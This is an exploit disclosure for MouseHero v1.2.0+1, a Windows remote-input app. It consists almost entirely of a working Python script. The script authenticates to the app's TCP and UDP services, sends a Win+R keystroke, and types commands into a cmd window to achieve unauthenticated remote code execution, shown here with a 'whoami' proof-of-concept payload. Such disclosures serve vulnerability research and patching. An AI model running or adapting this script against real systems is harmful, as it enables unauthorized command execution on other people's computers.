# Exploit Title: MouseHero v1.2.0+1 - Remote Code Execution (RCE)
# Date: July 26, 2026
# Exploit Author: tmrswrr / Hulya KARABAG
# Vendor Homepage: https://mousehero.aprilzz.com
# Software Link: https://downloads-mousehero.aprilzz.com/downloads/MouseHero-Windows-x86_64-latest.zip
# Version: 1.2.0+1
# Tested on: Windows 10 Enterprise LTSC Build 17763
#!/usr/bin/env python3
import socket
import struct
import time

HOST = "192.168.1.103"
TCP_PORT = 21216
UDP_PORT = 21217
AUTH = 10
TEXT = 5
KEYBOARD = 4
CLICK = 2
WIN = 8


def mpu(n):
    if n <= 0x7f:
        return bytes([n])
    if n <= 0xff:
        return b"\xcc" + struct.pack(">B", n)
    return b"\xcd" + struct.pack(">H", n)


def mps(s):
    b = s.encode()
    if len(b) <= 31:
        return bytes([0xa0 | len(b)]) + b
    if len(b) <= 0xff:
        return b"\xd9" + struct.pack(">B", len(b)) + b
    return b"\xda" + struct.pack(">H", len(b)) + b


def mpa(*items):
    return bytes([0x90 | len(items)]) + b"".join(items)


def pkt(kind, body, uid=1):
    hdr = mpa(mpu(uid), mpu(kind), mpu(6), mpu(len(body)))
    return struct.pack(">II", 4 + len(hdr) + len(body), len(hdr)) + hdr + body


def recv_uid(s):
    s.sendall(pkt(AUTH, mpa(mpu(1), mpu(3))))
    psize, hsize = struct.unpack(">II", s.recv(8))
    s.recv(hsize)
    body = s.recv(psize - 4 - hsize)
    return body[2] if len(body) > 2 else 1


def text(s, uid, value):
    s.sendall(pkt(TEXT, mps(value), uid))


def udp_key(u, seq, key, op=CLICK, mod=0):
    body = mpa(mpu(key), mpu(op), mpu(mod))
    hdr = mpa(mpu(seq), mpu(KEYBOARD), mpu(1), mpu(247))
    u.sendto(struct.pack(">II", 4 + len(hdr) + len(body), len(hdr)) + hdr + body, (HOST, UDP_PORT))


with socket.create_connection((HOST, TCP_PORT), timeout=5) as s:
    uid = recv_uid(s)
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as u:
        udp_key(u, uid, ord("r"), CLICK, WIN)
        time.sleep(1)
        text(s, uid, "cmd\n")
        time.sleep(1.5)
        text(s, uid, "whoami > %TEMP%\\mousehero_poc.txt\n")
